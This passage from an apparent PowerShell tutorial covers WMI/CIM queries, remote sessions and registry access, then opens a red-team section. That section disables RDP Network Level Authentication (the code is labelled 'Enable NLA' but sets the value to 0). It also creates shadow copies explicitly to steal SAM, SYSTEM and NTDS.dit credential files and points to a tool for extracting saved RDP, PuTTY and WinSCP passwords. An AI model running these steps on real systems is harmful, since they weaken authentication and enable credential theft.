</span></span><span class=line><span class=cl><span class=nb>Invoke-CimMethod</span> <span class=n>-ClassName</span> <span class=n>Win32_Process</span> <span class=n>-Name</span> <span class=n>Create</span> <span class=n>-Arguments</span>  <span class=vm>@</span><span class=p>{</span><span class=n>CommandLine</span> <span class=p>=</span> <span class=s2>&#34;calc.exe&#34;</span><span class=p>}</span>
</span></span></code></pre></div><h4 id=update-properties-of-a-wmi-object>Update properties of a WMI Object</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_Process</span> <span class=n>-Filter</span> <span class=s2>&#34;Name = &#39;notepad.exe&#39;&#34;</span> <span class=p>|</span> <span class=nb>Set-WmiInstance</span> <span class=n>-Arguments</span> <span class=vm>@</span><span class=p>{</span><span class=n>Comment</span> <span class=p>=</span> <span class=s2>&#34;Notepad test&#34;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimInstance</span> <span class=n>-Class</span> <span class=n>Win32_Process</span> <span class=n>-Filter</span> <span class=s2>&#34;Name = &#39;notepad.exe&#39;&#34;</span> <span class=p>|</span> <span class=nb>Set-CimInstance</span> <span class=n>-Arguments</span> <span class=vm>@</span><span class=p>{</span><span class=n>Comment</span> <span class=p>=</span> <span class=s2>&#34;Notepad test&#34;</span><span class=p>}</span>
</span></span></code></pre></div><h3 id=wmi-associations>WMI Associations</h3><p>There are relations between WMI classes which can be used to retrieve information about a managed object which is not available from a single class.
The following command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Query</span> <span class=s2>&#34;Associators of {Win32_NetworkAdapter.DeviceID=11}&#34;</span> 
</span></span><span class=line><span class=cl><span class=nb>Get-CimAssociatedInstance</span> <span class=n>-InputObject</span> <span class=p>(</span><span class=nb>Get-CimInstance</span> <span class=n>-ClassName</span> <span class=n>Win32_NetworkAdapter</span> <span class=n>-Filter</span> <span class=s1>&#39;DeviceId = 11&#39;</span><span class=p>)</span>
</span></span></code></pre></div><p>gives much more information about the object than the simple command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_NetworkAdapter</span> <span class=n>-Filter</span> <span class=s1>&#39;DeviceId = 11&#39;</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimInstance</span> <span class=n>-ClassName</span> <span class=n>Win32_NetworkAdapter</span> <span class=n>-Filter</span> <span class=s1>&#39;DeviceId = 11&#39;</span>
</span></span></code></pre></div><p>in fact the first one also gives instances related to all the associated classes.</p><p>The <strong>Associators of</strong> statement retrieves all instances that are associated with a particular source instance. The instances that are retrieved are referred to as the endpoints. Each endpoint is returned as many times as there are associations between it and the source object.</p><p>Get all association types relative to a particular class:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Query</span> <span class=s2>&#34;References of {Win32_NetworkAdapter.DeviceID=11} Where ClassDefsOnly&#34;</span>
</span></span></code></pre></div><p>Get all association types:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-CimClass</span> <span class=n>-ClassName</span> <span class=p>*</span> <span class=n>-Qualifier</span> <span class=s2>&#34;Association&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimClass</span> <span class=n>-ClassName</span> <span class=p>*</span><span class=n>binding</span><span class=p>*</span> <span class=n>-Qualifier</span> <span class=s2>&#34;Association&#34;</span>
</span></span></code></pre></div><p>The <strong>References of</strong> statement retrieves all association instances that refer to a particular source instance. The &ldquo;References of&rdquo; statement is similar to the &ldquo;Associators of&rdquo; statement in its syntax. However, rather than retrieving endpoint instances, it retrieves the intervening association instances.</p><p>Retrieve only instances associated with an association type (returned by the previous command):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Query</span> <span class=s2>&#34;Associators of {Win32_NetworkAdapter.DeviceID=11} Where AssocClass=Win32_SystemDevices&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimAssociatedInstance</span> <span class=n>-InputObject</span> <span class=p>(</span><span class=nb>Get-CimInstance</span> <span class=n>-ClassName</span> <span class=n>Win32_NetworkAdapter</span> <span class=n>-Filter</span> <span class=s1>&#39;DeviceId = 11&#39;</span><span class=p>)</span> <span class=n>-Associations</span> <span class=n>Win32_SystemDevices</span>
</span></span></code></pre></div><p>Retrieve only instances associated with an associated class type:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Query</span> <span class=s2>&#34;References of {Win32_NetworkAdapter.DeviceID=11} Where ClassDefsOnly&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Query</span> <span class=s2>&#34;Associators of {Win32_NetworkAdapter.DeviceID=11} Where ResultClass=Win32_NetworkAdapterConfiguration&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Query</span> <span class=s2>&#34;References of {Win32_NetworkAdapter.DeviceID=11} Where ClassDefsOnly&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimAssociatedInstance</span> <span class=n>-InputObject</span> <span class=p>(</span><span class=nb>Get-CimInstance</span> <span class=n>-ClassName</span> <span class=n>Win32_NetworkAdapter</span> <span class=n>-Filter</span> <span class=s1>&#39;DeviceId = 11&#39;</span><span class=p>)</span> <span class=n>-ResultClass</span> <span class=n>Win32_NetworkAdapterConfiguration</span>
</span></span></code></pre></div><p>List process owners:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-CimInstance</span> <span class=n>-Namespace</span> <span class=s2>&#34;root/cimv2&#34;</span> <span class=n>-ClassName</span> <span class=n>Win32_Process</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Query</span> <span class=s2>&#34;Associators of {Win32_Process=13920} Where ClassDefsOnly&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Query</span> <span class=s2>&#34;Associators of {Win32_Process=13920} Where ResultClass=Win32_LogonSession&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Query</span> <span class=s2>&#34;Associators of {Win32_LogonSession=720560} Where ClassDefsOnly&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Query</span> <span class=s2>&#34;Associators of {Win32_LogonSession=720560} where ResultClass=Win32_Account&#34;</span>
</span></span></code></pre></div><p>which can be also rewritten as:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$PROCESS_ID</span> <span class=p>=</span> <span class=mf>13920</span> <span class=c># PROCESS ID (PID)</span>
</span></span><span class=line><span class=cl><span class=nv>$QUERY_1</span> <span class=p>=</span> <span class=s2>&#34;Associators of {Win32_Process=&#34;</span> <span class=p>+</span> <span class=nv>$PROCESS_ID</span> <span class=p>+</span> <span class=s2>&#34;} Where ResultClass=Win32_LogonSession&#34;</span>
</span></span><span class=line><span class=cl><span class=nv>$LOGON_ID</span> <span class=p>=</span> <span class=p>(</span><span class=nb>Get-WmiObject</span> <span class=n>-Query</span> <span class=nv>$QUERY_1</span><span class=p>).</span><span class=py>LogonId</span>
</span></span><span class=line><span class=cl><span class=nv>$QUERY_2</span> <span class=p>=</span> <span class=s2>&#34;Associators of {Win32_LogonSession=&#34;</span> <span class=p>+</span> <span class=nv>$LOGON_ID</span> <span class=p>+</span> <span class=s2>&#34;} where ResultClass=Win32_Account&#34;</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nb>Get-WmiObject</span> <span class=n>-Query</span> <span class=nv>$QUERY_2</span><span class=p>).</span><span class=py>Name</span>
</span></span></code></pre></div><p>List owners of all the files on the desktop:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-CimInstance</span> <span class=n>-Query</span> <span class=s2>&#34;Associators Of {Win32_Directory.Name=&#39;C:\users\pecoraro\desktop&#39;} Where ResultClass = CIM_DataFile&#34;</span> <span class=p>|</span> <span class=nb>foreach-object</span> <span class=p>{</span><span class=nb>Write-Host</span> <span class=n>-BackgroundColor</span> <span class=n>Red</span> <span class=s2>&#34;FILENAME: &#34;</span><span class=nv>$_</span><span class=p>.</span><span class=n>Name</span><span class=p>;</span> <span class=nv>$QUERY</span> <span class=p>=</span> <span class=s2>&#34;Associators of {Win32_LogicalFileSecuritySetting.Path=&#39;&#34;</span> <span class=p>+</span> <span class=nv>$_</span><span class=p>.</span><span class=py>Name</span> <span class=p>+</span> <span class=s2>&#34;&#39;} Where ResultClass=Win32_SID&#34;</span><span class=p>;</span> <span class=nb>Get-CimInstance</span> <span class=n>-Query</span> <span class=nv>$QUERY</span><span class=p>}</span>
</span></span></code></pre></div><h3 id=wmi-on-remote-computers>WMI on Remote Computers</h3><p>WMI can also be executed on remote computers, but it requires admin privileges on the remote machine.
WMI uses DCOM on port 135 (Winmgmt service) and it is not firewall and NAT friendly. Data exchange is performed on dynamic ports which can be configured in registry. CIM cmdlets through CIM sessions are able to use both DCOM port 135 and WinRM/WSMan ports 5585-5586, which are firewall and NAT friendly.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># WMI</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_BIOS</span> <span class=n>-ComputerName</span> <span class=s2>&#34;COMPUTER01&#34;</span> <span class=n>-Credential</span> <span class=s2>&#34;CYBERLAB\STUDENT01&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># CIM</span>
</span></span><span class=line><span class=cl><span class=nv>$session</span> <span class=p>=</span> <span class=nb>New-CimSession</span> <span class=n>-ComputerName</span> <span class=s2>&#34;COMPUTER01&#34;</span> <span class=n>-Credential</span> <span class=s2>&#34;CYBERLAB\STUDENT01&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimInstance</span> <span class=n>-CimSession</span> <span class=nv>$session</span> <span class=n>-ClassName</span> <span class=n>Win32_BIOS</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Force CIM to use DCOM in place of WSMAN</span>
</span></span><span class=line><span class=cl><span class=nv>$sessionoption</span> <span class=p>=</span> <span class=nb>New-CimSessionOption</span> <span class=n>-Protocol</span> <span class=n>DCOM</span>
</span></span><span class=line><span class=cl><span class=nv>$session</span> <span class=p>=</span> <span class=nb>New-CimSession</span> <span class=n>-ComputerName</span> <span class=s2>&#34;COMPUTER01&#34;</span> <span class=n>-SessionOption</span> <span class=nv>$sessionoption</span> <span class=n>-Credential</span> <span class=s2>&#34;CYBERLAB\STUDENT01&#34;</span>
</span></span></code></pre></div><h3 id=windows-registry-with-wmi>Windows Registry with WMI</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Namespace</span> <span class=s2>&#34;root\default&#34;</span> <span class=n>-Class</span> <span class=n>StdRegProv</span> <span class=n>-List</span> <span class=p>|</span> <span class=nb>select </span><span class=n>-ExpandProperty</span> <span class=n>Methods</span>
</span></span></code></pre></div><p>Constants required to access Registry Hives:</p><table><thead><tr><th>Registry Hive</th><th>Constant</th></tr></thead><tbody><tr><td>$HIVE_HKROOT</td><td>2147483648</td></tr><tr><td>$HIVE_HKCU</td><td>2147483649</td></tr><tr><td>$HIVE_HKLM</td><td>2147483650</td></tr><tr><td>$HIVE_HKU</td><td>2147483651</td></tr></tbody></table><p>Value data types:</p><table><thead><tr><th>Data Type</th><th>Constant</th></tr></thead><tbody><tr><td>$REG_SZ</td><td>1</td></tr><tr><td>$REG_EXPAND_SZ</td><td>2</td></tr><tr><td>$REG_BINARY</td><td>3</td></tr><tr><td>$REG_DWORD</td><td>4</td></tr><tr><td>$REG_MULTI_SZ</td><td>7</td></tr><tr><td>$REG_QWORD</td><td>11</td></tr></tbody></table><p>Retreive Internet Explorer typed URLs (<code>HKCU:\software\microsoft\internet explorer\typedurls</code>):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Invoke-WmiMethod</span> <span class=n>-Namespace</span> <span class=s2>&#34;root\default&#34;</span> <span class=n>-Class</span> <span class=n>StdRegProv</span> <span class=n>-Name</span> <span class=n>EnumKey</span> <span class=n>-ArgumentList</span> <span class=vm>@</span><span class=p>(</span><span class=mf>2147483649</span><span class=p>,</span> <span class=s2>&#34;software\microsoft\internet explorer&#34;</span><span class=p>)</span> <span class=p>|</span> <span class=nb>select </span><span class=n>-ExpandProperty</span> <span class=n>sNames</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-WmiMethod</span> <span class=n>-Namespace</span> <span class=s2>&#34;root\default&#34;</span> <span class=n>-Class</span> <span class=n>StdRegProv</span> <span class=n>-Name</span> <span class=n>EnumValues</span> <span class=n>-ArgumentList</span> <span class=vm>@</span><span class=p>(</span><span class=mf>2147483649</span><span class=p>,</span> <span class=s2>&#34;software\microsoft\internet explorer\typedurls&#34;</span><span class=p>)</span> <span class=p>|</span> <span class=nb>select </span><span class=n>-ExpandProperty</span> <span class=n>sNames</span>
</span></span><span class=line><span class=cl><span class=nb>Invoke-WmiMethod</span> <span class=n>-Namespace</span> <span class=s2>&#34;root\default&#34;</span> <span class=n>-Class</span> <span class=n>StdRegProv</span> <span class=n>-Name</span> <span class=n>GetStringValue</span> <span class=n>-ArgumentList</span>  <span class=vm>@</span><span class=p>(</span><span class=mf>2147483649</span><span class=p>,</span> <span class=s2>&#34;software\microsoft\internet explorer\typedurls&#34;</span><span class=p>,</span> <span class=s2>&#34;url1&#34;</span><span class=p>)</span> <span class=p>|</span> <span class=nb>select </span><span class=n>-ExpandProperty</span> <span class=n>sValue</span>
</span></span></code></pre></div><p>It can also be made simpler by using a variable (in particular for remote computers):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$regProv</span> <span class=p>=</span> <span class=nb>Get-WmiObject</span> <span class=n>-Namespace</span> <span class=s2>&#34;root\default&#34;</span> <span class=n>-Class</span> <span class=n>StdRegProv</span> <span class=n>-ComputerName</span> <span class=s2>&#34;CYBERLAB\COMPUTER01&#34;</span> <span class=n>-List</span> 
</span></span><span class=line><span class=cl><span class=nv>$regProv</span><span class=p>.</span><span class=py>Methods</span> <span class=p>|</span> <span class=nb>select </span><span class=n>name</span>
</span></span><span class=line><span class=cl><span class=c># Name</span>
</span></span><span class=line><span class=cl><span class=c># ----</span>
</span></span><span class=line><span class=cl><span class=c># CreateKey</span>
</span></span><span class=line><span class=cl><span class=c># DeleteKey</span>
</span></span><span class=line><span class=cl><span class=c># EnumKey</span>
</span></span><span class=line><span class=cl><span class=c># EnumValues</span>
</span></span><span class=line><span class=cl><span class=c># DeleteValue</span>
</span></span><span class=line><span class=cl><span class=c># SetDWORDValue</span>
</span></span><span class=line><span class=cl><span class=c># SetQWORDValue</span>
</span></span><span class=line><span class=cl><span class=c># GetDWORDValue</span>
</span></span><span class=line><span class=cl><span class=c># GetQWORDValue</span>
</span></span><span class=line><span class=cl><span class=c># SetStringValue</span>
</span></span><span class=line><span class=cl><span class=c># GetStringValue</span>
</span></span><span class=line><span class=cl><span class=c># SetMultiStringValue</span>
</span></span><span class=line><span class=cl><span class=c># GetMultiStringValue</span>
</span></span><span class=line><span class=cl><span class=c># SetExpandedStringValue</span>
</span></span><span class=line><span class=cl><span class=c># GetExpandedStringValue</span>
</span></span><span class=line><span class=cl><span class=c># SetBinaryValue</span>
</span></span><span class=line><span class=cl><span class=c># GetBinaryValue</span>
</span></span><span class=line><span class=cl><span class=c># CheckAccess</span>
</span></span><span class=line><span class=cl><span class=c># SetSecurityDescriptor</span>
</span></span><span class=line><span class=cl><span class=c># GetSecurityDescriptor</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$regProv</span><span class=p>.</span><span class=py>getStringValue</span><span class=p>(</span><span class=mf>2147483649</span><span class=p>,</span> <span class=s2>&#34;software\microsoft\internet explorer\typedurls&#34;</span><span class=p>,</span> <span class=s2>&#34;url1&#34;</span><span class=p>)</span> <span class=p>|</span> <span class=nb>select </span><span class=n>-ExpandProperty</span> <span class=n>sValue</span>
</span></span></code></pre></div><p>List autorun programs (<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code>):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Get WMI registry object</span>
</span></span><span class=line><span class=cl><span class=nv>$regProv</span> <span class=p>=</span> <span class=nb>Get-WmiObject</span> <span class=n>-Namespace</span> <span class=s2>&#34;root\default&#34;</span> <span class=n>-Class</span> <span class=n>StdRegProv</span> <span class=n>-List</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># List available methods</span>
</span></span><span class=line><span class=cl><span class=nv>$regProv</span><span class=p>.</span><span class=py>methods</span> <span class=p>|</span> <span class=nb>select </span><span class=n>name</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># List keys in Software\Microsoft\Windows\CurrentVersion</span>
</span></span><span class=line><span class=cl><span class=nv>$regProv</span><span class=p>.</span><span class=py>EnumKey</span><span class=p>(</span><span class=mf>2147483649</span><span class=p>,</span> <span class=s2>&#34;Software\Microsoft\Windows\CurrentVersion&#34;</span><span class=p>)</span> <span class=p>|</span> <span class=nb>select </span><span class=n>-ExpandProperty</span> <span class=n>sNames</span>
</span></span><span class=line><span class=cl><span class=c># Run</span>
</span></span><span class=line><span class=cl><span class=c># RunOnce</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># List all values of the selected key</span>
</span></span><span class=line><span class=cl><span class=nv>$regProv</span><span class=p>.</span><span class=py>EnumValues</span><span class=p>(</span><span class=mf>2147483649</span><span class=p>,</span> <span class=s2>&#34;Software\Microsoft\Windows\CurrentVersion\Run&#34;</span><span class=p>)</span> <span class=p>|</span> <span class=nb>select </span><span class=n>-ExpandProperty</span> <span class=n>sNames</span>
</span></span><span class=line><span class=cl><span class=c># OneDrive</span>
</span></span><span class=line><span class=cl><span class=c># CCleaner Smart Cleaning</span>
</span></span><span class=line><span class=cl><span class=c># NordVPN</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Get string value among all values of the selected key</span>
</span></span><span class=line><span class=cl><span class=nv>$regProv</span><span class=p>.</span><span class=py>getStringValue</span><span class=p>(</span><span class=mf>2147483649</span><span class=p>,</span> <span class=s2>&#34;Software\Microsoft\Windows\CurrentVersion\Run&#34;</span><span class=p>,</span> <span class=s2>&#34;OneDrive&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nv>$regProv</span><span class=p>.</span><span class=py>getStringValue</span><span class=p>(</span><span class=mf>2147483649</span><span class=p>,</span> <span class=s2>&#34;Software\Microsoft\Windows\CurrentVersion\Run&#34;</span><span class=p>,</span> <span class=s2>&#34;OneDrive&#34;</span><span class=p>)</span> <span class=p>|</span> <span class=nb>select </span><span class=n>-ExpandProperty</span> <span class=n>sValue</span>
</span></span></code></pre></div><p>List installed applications:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$regProv</span> <span class=p>=</span> <span class=nb>Get-WmiObject</span> <span class=n>-Namespace</span> <span class=s2>&#34;root\default&#34;</span> <span class=n>-Class</span> <span class=n>StdRegProv</span> <span class=n>-List</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$regProv</span><span class=p>.</span><span class=py>EnumKey</span><span class=p>(</span><span class=mf>2147483649</span><span class=p>,</span> <span class=s2>&#34;Software\Microsoft\Windows\CurrentVersion&#34;</span><span class=p>)</span> <span class=p>|</span> <span class=nb>select </span><span class=n>-ExpandProperty</span> <span class=n>sNames</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$regProv</span><span class=p>.</span><span class=py>EnumKey</span><span class=p>(</span><span class=mf>2147483649</span><span class=p>,</span> <span class=s2>&#34;Software\Microsoft\Windows\CurrentVersion\Uninstall&#34;</span><span class=p>)</span> <span class=p>|</span> <span class=nb>select </span><span class=n>-ExpandProperty</span> <span class=n>sNames</span>
</span></span><span class=line><span class=cl><span class=c># ActiveTouchMeetingClient</span>
</span></span><span class=line><span class=cl><span class=c># Discord</span>
</span></span><span class=line><span class=cl><span class=c># Fiddler2</span>
</span></span><span class=line><span class=cl><span class=c># OneDriveSetup.exe</span>
</span></span><span class=line><span class=cl><span class=c># Pulse_Setup_Client</span>
</span></span><span class=line><span class=cl><span class=c># Pulse_Term_Services</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$regProv</span><span class=p>.</span><span class=py>EnumValues</span><span class=p>(</span><span class=mf>2147483649</span><span class=p>,</span> <span class=s2>&#34;Software\Microsoft\Windows\CurrentVersion\Uninstall\OneDriveSetup.exe&#34;</span><span class=p>)</span> <span class=p>|</span> <span class=nb>select </span><span class=n>-ExpandProperty</span> <span class=n>sNames</span>
</span></span><span class=line><span class=cl><span class=c># DisplayName</span>
</span></span><span class=line><span class=cl><span class=c># DisplayIcon</span>
</span></span><span class=line><span class=cl><span class=c># DisplayVersion</span>
</span></span><span class=line><span class=cl><span class=c># HelpLink</span>
</span></span><span class=line><span class=cl><span class=c># Publisher</span>
</span></span><span class=line><span class=cl><span class=c># UninstallString</span>
</span></span><span class=line><span class=cl><span class=c># UrlUpdateInfo</span>
</span></span><span class=line><span class=cl><span class=c># EstimatedSize</span>
</span></span><span class=line><span class=cl><span class=c># NoRepair</span>
</span></span><span class=line><span class=cl><span class=c># NoModify</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$regProv</span><span class=p>.</span><span class=py>getStringValue</span><span class=p>(</span><span class=mf>2147483649</span><span class=p>,</span> <span class=s2>&#34;Software\Microsoft\Windows\CurrentVersion\Uninstall\OneDriveSetup.exe&#34;</span><span class=p>,</span> <span class=s2>&#34;DisplayName&#34;</span><span class=p>)</span> <span class=p>|</span> <span class=nb>select </span><span class=n>-ExpandProperty</span> <span class=n>sValue</span>
</span></span><span class=line><span class=cl><span class=c># Microsoft OneDrive</span>
</span></span></code></pre></div><p>List WMI installation directory:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$regProv</span> <span class=p>=</span> <span class=nb>Get-WmiObject</span> <span class=n>-Namespace</span> <span class=s2>&#34;root\default&#34;</span> <span class=n>-Class</span> <span class=n>StdRegProv</span> <span class=n>-List</span> 
</span></span><span class=line><span class=cl><span class=nv>$regProv</span><span class=p>.</span><span class=py>getStringValue</span><span class=p>(</span><span class=mf>2147483650</span><span class=p>,</span> <span class=s2>&#34;software\microsoft\wbem&#34;</span><span class=p>,</span> <span class=s2>&#34;Installation Directory&#34;</span><span class=p>)</span> <span class=p>|</span> <span class=nb>select </span><span class=n>-ExpandProperty</span> <span class=n>sValue</span>
</span></span></code></pre></div><p>Edit regitry to turn off Network Level Authentication (NLA):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$regProv</span> <span class=p>=</span> <span class=nb>Get-WmiObject</span> <span class=n>-Namespace</span> <span class=s2>&#34;root\default&#34;</span> <span class=n>-Class</span> <span class=n>StdRegProv</span> <span class=n>-List</span> 
</span></span><span class=line><span class=cl><span class=nv>$regProv</span><span class=p>.</span><span class=py>EnumValues</span><span class=p>(</span><span class=mf>2147483650</span><span class=p>,</span><span class=s2>&#34;SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#34;</span><span class=p>)</span> <span class=p>|</span> <span class=nb>select </span><span class=n>-ExpandProperty</span> <span class=n>sNames</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Check NLA enabling status</span>
</span></span><span class=line><span class=cl><span class=nv>$regProv</span><span class=p>.</span><span class=py>GetDWORDValue</span><span class=p>(</span><span class=mf>2147483650</span><span class=p>,</span> <span class=s2>&#34;SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#34;</span><span class=p>,</span> <span class=s2>&#34;UserAuthentication&#34;</span><span class=p>)</span> <span class=p>|</span> <span class=nb>select </span><span class=n>-ExpandProperty</span> <span class=n>uValue</span>
</span></span><span class=line><span class=cl><span class=c># 0 --&gt; NLA disabled</span>
</span></span><span class=line><span class=cl><span class=c># 1 --&gt; NLA enabled</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Enable NLA</span>
</span></span><span class=line><span class=cl><span class=nv>$regProv</span><span class=p>.</span><span class=py>SetDWORDValue</span><span class=p>(</span><span class=mf>2147483650</span><span class=p>,</span> <span class=s2>&#34;SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#34;</span><span class=p>,</span> <span class=s2>&#34;UserAuthentication&#34;</span><span class=p>,</span> <span class=mf>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Check NLA enabling status</span>
</span></span><span class=line><span class=cl><span class=nv>$regProv</span><span class=p>.</span><span class=py>GetDWORDValue</span><span class=p>(</span><span class=mf>2147483650</span><span class=p>,</span> <span class=s2>&#34;SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#34;</span><span class=p>,</span> <span class=s2>&#34;UserAuthentication&#34;</span><span class=p>)</span> <span class=p>|</span> <span class=nb>select </span><span class=n>-ExpandProperty</span> <span class=n>uValue</span>
</span></span></code></pre></div><h2 id=wmi-for-red-teams>WMI for Red Teams</h2><h3 id=information-gathering>Information Gathering</h3><p>These commands for information gathering can be executed both on a local or remote box:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># List routes</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_IP4RouteTable</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimInstance</span> <span class=n>-ClassName</span> <span class=n>Win32_IP4RouteTable</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># List users (it provides also domain users and bidirectional trusted domain users)</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_UserAccount</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimInstance</span> <span class=n>-ClassName</span> <span class=n>Win32_UserAccount</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># List groups</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_Group</span>
</span></span><span class=line><span class=cl><span class=nb>Get-CimInstance</span> <span class=n>-ClassName</span> <span class=n>Win32_Group</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c># Create a shadow copy</span>
</span></span><span class=line><span class=cl><span class=c># Shadow Copy is a technology included in Microsoft Windows that can create backup copies or snapshots of computer files or volumes even when they are in use. It can be useful to steal data from SAM, SYSTEM or NTDS.dit files in particular from remote boxes.</span>
</span></span><span class=line><span class=cl><span class=c># List existing shadow copies</span>
</span></span><span class=line><span class=cl><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_ShadowCopy</span>
</span></span><span class=line><span class=cl><span class=c># Use class method to create a shadow copy of &#34;C:\&#34;</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_ShadowCopy</span> <span class=n>-List</span><span class=p>).</span><span class=py>create</span><span class=p>(</span><span class=s2>&#34;C:\&#34;</span><span class=p>,</span> <span class=s2>&#34;ClientAccessible&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c># Create a link to the shadow copy</span>
</span></span><span class=line><span class=cl><span class=nv>$link</span> <span class=p>=</span> <span class=p>(</span><span class=nb>Get-WmiObject</span> <span class=n>-Class</span> <span class=n>Win32_ShadowCopy</span><span class=p>).</span><span class=py>DeviceObject</span> <span class=p>+</span> <span class=s2>&#34;\&#34;</span>
</span></span><span class=line><span class=cl><span class=n>cmd</span> <span class=p>/</span><span class=n>c</span> <span class=n>mklink</span> <span class=p>/</span><span class=n>d</span> <span class=n>C:</span><span class=p>\</span><span class=n>shadowcopy</span> <span class=s2>&#34;</span><span class=nv>$link</span><span class=s2>&#34;</span>
</span></span></code></pre></div><p><code>Invoke-SessionGopher.ps1</code> is a useful tool to extract information from registry on local or remote (requires admin privs) about RDP, Putty sessions and WinSCP passwords. It is part of <code>Nishang</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Nishang</span>
